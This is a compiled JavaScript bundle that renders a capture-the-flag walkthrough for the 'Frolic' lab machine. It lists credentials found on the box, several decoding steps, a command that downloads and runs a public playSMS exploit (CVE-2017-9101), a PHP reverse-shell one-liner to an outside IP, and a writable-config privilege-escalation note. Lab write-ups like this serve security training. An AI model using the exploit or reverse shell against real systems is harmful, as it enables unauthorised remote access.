(window.webpackJsonp=window.webpackJsonp||[]).push([[74],{415:function(a,e,s){"use strict";s.r(e);var t=s(13),r=Object(t.a)({},(function(){var a=this,e=a._self._c;return e("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[e("h1",{attrs:{id:"frolic"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#frolic"}},[a._v("#")]),a._v(" Frolic")]),a._v(" "),e("p",[a._v("IP: "),e("code",[a._v("10.10.10.111")])]),a._v(" "),e("h2",{attrs:{id:"findings"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#findings"}},[a._v("#")]),a._v(" Findings")]),a._v(" "),e("ul",[e("li",[a._v("port 9999\n"),e("ul",[e("li",[e("code",[a._v("/backup/password.txt")]),a._v(" login password of "),e("code",[a._v("imnothuman")])]),a._v(" "),e("li",[e("code",[a._v("/admin")]),a._v(" login password of "),e("code",[a._v("superduperlooperpassword_lol")])]),a._v(" "),e("li",[a._v("logging in grants a ook language page, decoding gives a path: "),e("code",[a._v("/asdiSIAJJ0QWE9JAS")])]),a._v(" "),e("li",[a._v("The contents of that path look like base64 encoded")]),a._v(" "),e("li",[a._v("We extract that into a text file and remove spaces")]),a._v(" "),e("li",[a._v("Now use "),e("code",[a._v("base64 -d hash")]),a._v(" to decode it and redirect output to a file")]),a._v(" "),e("li",[a._v("When running "),e("code",[a._v("file")]),a._v(" on the newly decoded file, it appears as a zip")]),a._v(" "),e("li",[a._v("Unzipping the file with password "),e("code",[a._v("password")]),a._v(" reveals another base64 like file in hex")]),a._v(" "),e("li",[a._v("Convert hex to base64 with "),e("code",[a._v("xxd")])]),a._v(" "),e("li",[a._v("Code is brain**** and decoding gives "),e("code",[a._v("idkwhatispass")])]),a._v(" "),e("li",[a._v("For the "),e("code",[a._v("/playsms")]),a._v(" directory, the username "),e("code",[a._v("admin")]),a._v("/"),e("code",[a._v("idkwhatispass")]),a._v(" works")])])])]),a._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[a._v("wget")]),a._v(" https://github.com/jasperla/CVE-2017-9101/raw/master/playsmshell.py\n\npython3 playsmshell.py "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--username")]),a._v(" admin "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--password")]),a._v(" idkwhatispass "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--url")]),a._v(" http://10.10.10.111:9999/playsms "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--interactive")]),a._v("\n")])])]),e("p",[a._v("Get a better shell back with:")]),a._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[a._v("php "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-r")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[a._v('\'$sock=fsockopen("10.10.14.21",443);exec("/bin/sh -i <&3 >&3 2>&3");\'')]),a._v("\n")])])]),e("h2",{attrs:{id:"priv-esc"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#priv-esc"}},[a._v("#")]),a._v(" Priv esc")]),a._v(" "),e("p",[e("code",[a._v("/var/www/html/playsms/plugin/themes/ubuntu/config.php")]),a._v(" writable, used by playsms")])])}),[],!1,null,null,null);e.default=r.exports}}]);